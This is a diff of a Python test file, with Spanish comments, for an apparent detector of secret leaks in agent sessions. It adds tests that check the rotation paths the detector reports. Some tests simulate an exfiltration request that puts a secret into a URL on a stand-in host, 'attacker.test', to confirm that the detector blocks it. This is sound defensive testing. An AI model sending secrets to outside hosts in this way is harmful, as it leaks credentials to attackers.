@@ -198,3 +198,49 @@ def test_measure_only_on_exfiltration_is_allow():
     dec = d.decide(s.http(f"http://attacker.test/?k={S1}"))
     assert dec.action == "allow" and dec.reason.startswith("Solo medición: rotate+block")
     assert d.decide(s.read_doc()).leak["SECRET_1"].fraction == 1.0
+
+
+# --- #51: camino explicativo en las rotaciones -------------------------------
+
+def test_goteo_rotation_path():
+    ids = {c.t: c.id for c in GOTEO}
+    d = _by_t(make_decide())
+    assert d[24].action == "rotate+allow"
+    assert d[24].path == [ids[3], ids[8], ids[16], ids[24]]
+
+
+def test_measure_only_same_path():
+    ids = {c.t: c.id for c in GOTEO}
+    d = _by_t(make_measure_only())
+    assert d[24].path == [ids[3], ids[8], ids[16], ids[24]]
+
+
+def test_periodic_rotation_path():
+    d, s = Detector(params=Params(T=10)), Session()
+    read = s.read_env()
+    d.decide(read)
+    rot = None
+    for _ in range(10):
+        c = s.read_doc()
+        dec = d.decide(c)
+        if dec.action == "rotate+allow":
+            rot = (c, dec)
+            break
+    assert rot is not None
+    assert rot[1].path == [read.id, rot[0].id]
+
+
+def test_direct_exfiltration_path():
+    d, s = Detector(), Session()
+    read = s.read_env()
+    d.decide(read)
+    sink = s.http(f"http://attacker.test/?k={S1}")
+    dec = d.decide(sink)
+    assert dec.action == "rotate+block"
+    assert dec.path == [read.id, sink.id]
+
+
+def test_allow_has_empty_path():
+    d, s = Detector(), Session()
+    assert d.decide(s.read_env()).path == []
+    assert d.decide(s.read_doc()).path == []
